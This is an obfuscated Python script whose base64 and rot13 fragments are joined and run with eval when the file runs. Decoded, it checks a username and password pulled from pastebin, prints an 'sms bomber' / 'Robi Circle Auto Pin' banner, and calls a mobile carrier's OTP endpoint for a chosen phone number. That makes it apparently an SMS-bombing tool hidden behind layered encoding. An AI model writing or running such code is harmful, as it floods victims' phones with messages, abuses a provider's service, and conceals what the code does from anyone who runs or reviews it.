import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzCmZyb20gcmVxdWVzdHMuc3RydWN0dXJlcyBpbXBvcnQgQ2FzZUluc2Vuc2l0aXZlRGljdAppbXBvcnQgc3lzCnVzZXJlcT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ZQWpSYUVzQyIpCnBhc3NyZXE9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvc2I4a1ltTWgiKQp1c2Vybj11c2VyZXEudGV4dApwYXNzdz1wYXNzcmVxLnRleHQKCmlucHVzZXI9c3RyKGlucHV0KCJFbnRlciBZb3VyIFVzZXJuYW1lIDogIikpCmlucHBhc3M9c3RyKGlucHV0KCJFbnRlciBZb3VyIFBhc3N3b3JkIDogIikpCgppZiB1c2Vybj09aW5wdXNlciBhbmQgcGFzc3c9PWlucHBhc3M6CglwcmludCAoIiBb4oiaXSBVc2VyICYgUGFzc3dvcmQgQ29ycmVjdCIpCglwYXNzCmVsc2U6CglwcmludCAoIiBbw5ddIFdyb25nIFVzZXIgJiBQYXNzd29yZCIpCglzeXMuZXhpdCgpCnByaW50ICgiIFdlbGxjb21lICIpCgoKcHJpbnQoIiIiCgrilojilojilojilZfilpHilpHilojilojilZfilpHilojilojilojilojilojilZfilpHilojilojilZfil'
love = 'cUvycUvycUvybwvybwvyMsvycUvybwvybwvybwvybwvybwvyMsvycUvybwvybwvybwvyMsvycUvycUvybwvybwvyMpX4cnV4cnV4cnV4cnV4cJK4cnE4cnV4cnV4cJE4cnV4cnV4cJH4cJD4cJD4cnV4cnV4cJK4cJn4cnV4cnV4cJK4cnE4cnV4cnV4cJH4cJq4cnV4cnV4cJH4cJD4cJD4cnV4cnV4cJK4cnV4cnV4cnV4cnV4cJK4cnE4cnV4cnV4cJEPhXJvBXJvBXIyBXJvBXJvBXIy+XJvBXJvBXIxrXJvBXJvBXIxrXJxrXJxrXJvBXJvBXIxrXJxrXIzhXJvBXJvBXJvBXJvBXIyBXIarXJxrXJvBXJvBXIxrXJxrXJxrXJvBXJvBXIxrXJvBXJvBXIyBXJvBXJvBXIy+XJvBXJvBXIxDevybwvybwvyMUvyMevybwvybwvybwvybwvyMUvybwvybwvyMUvycUvycUvybwvybwvyMUvycUvycUvyMevybwvybwvyMGvyM3vycUvycUvybwvybwvyMUvycUvycUvybwvybwvyMUvybwvybwvyMUvyMevybwvybwvybwvybwvyMRX4cnV4cnV4cJE4cnE4cJn4cnV4cnV4cnV4cJE4cJn4cnV4cnV4cnV4cnV4cnV4cJH4cJq4cnE4cnE4cnE4cnV4cnV4cJE4cnE4cnE4cnE4cJn4cnV4cnV4cnV4cnV4cnV4cJH4cJq4c'
god = 'aI4paI4pWR4paR4pWa4paI4paI4paI4pWRCuKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVneKWkeKVmuKVkOKVkOKVkOKVkOKVneKWkeKWkeKWkeKWkeKVmuKVkOKVneKWkeKWkeKWkeKWkeKVmuKVkOKVkOKVkOKVkOKVneKWkeKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVnQoKCiAgICAgXy4tXl4tLS0uLi4uLCwtLS0tICAgICAgIAogXy0tICAgICAgICBzbXMgICAgICAgIC0tX18gIAo8ICAgICAgICAgIGJvbWJlciAgICAgICAgID4pCnwgICAgICAgICAgICAgICAgICAgICAgICAgfCAKIFwuXyAgICAgICAgICAgICAgICAgICBfLi8gIAogICAgYGBgLS0uIC4gLCA7IC4tLScnJyAgICAgICAKICAgICAgICAgIHwgfCAgIHwgICAgICAgICAgICAgCiAgICAgICAuLT18fCAgfCB8PS0uICAgCiAgICAgICBgLT0jJCUmJSQjPS0nICAgCiAgICAgICAgICB8IDsgIDp8ICAgICAKIF9fX19fLiwtIyUmJEAlIyYjfiwuX19fX18KIiIiKSAgCgpwcmludCAoIlwwMzNbMzNtIisiICAgICAgICAg4paR4paS4paT4paIIFJvYmkgQ2lyY2xlIEF1dG8gUGluIOKWiOKWk+KWkuKWkSAgICAgICAgICIpCgk'
destiny = 'XpUWcoaDtXPWpZQZmJmZmoFVeVvNtVPNtVPNtVBdatrP8hhXMz++4wvOQpzIuqTIxVTW5VR5C6czjJH/dzoOBYvQvzMiihV7tiYidc4VtVPNtVPNtVPVcPtbXpUWcoaDtXPWpZQZmJmZloFVcPz51oJWypvNtCFOmqUVbnJ5jqKDbVvNtVPNtVPOoCy0tEJ50MKVtITuyVSWiDzxiDJylqTIfVR51oJWypwbtVvxcPtcuoJ91oaDtCFOcoaDbnJ5jqKDbVvNtVPNtVPNtJm5qVRAbo2ywMFOMo3IlVSOcovOOoJ91oaDtBvNvXFxXPzSjnFN9VPWbqUEjpmbiY2AcpzAfMF5lo2WcYzAioF5vMP9grJkcMzHiLKOjLKOcY2SjpTAuoTjhpTujC29jCJqyqR9HDlMjnJ49ZGZjZQVzLKOjK3MypaAco249AmtzoKAcp2EhCGt4VvghqJ1vMKVXPzuyLJEypaZtCFOQLKAyFJ5mMJ5mnKEcqzIRnJA0XPxXnTIuMTIlp1fvrP1upUNgn2I5Vy0tCFNvZQNjo2Zjp280BT93n3p0pmO3q280LmNjMmNjBQN0qmtjM3qeqmueMlVXPaOlnJ50VPtvKQNmZ1fkBmZkoFVcPzMipvOcVTyhVUWuozqyVPuuoJ91oaDcBtbWpzIkqJImqUZhM2I0XTSjnFkbMJSxMKWmCJuyLJEypaZcVNbWpUWcoaDbp3ElXTxcXlVtVRS0qTSwnlNvXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))